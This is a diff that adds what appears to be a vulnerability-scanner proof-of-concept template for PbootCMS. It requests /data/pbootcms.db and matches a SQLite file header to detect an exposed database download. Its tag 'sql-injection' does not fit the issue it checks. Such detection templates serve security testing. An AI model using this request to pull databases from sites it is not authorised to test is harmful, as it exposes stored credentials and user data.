@@ -1,0 +1,22 @@
+id: poc-yaml-pbootcms-database-file-download
+info:
+  name: Pbootcms Database 任意文件下载漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: PbootCMS
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /data/pbootcms.db
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "^SQLite format 3\\x00\\x10") &&
+    contains(body, "PbootCMS")
+  output: []
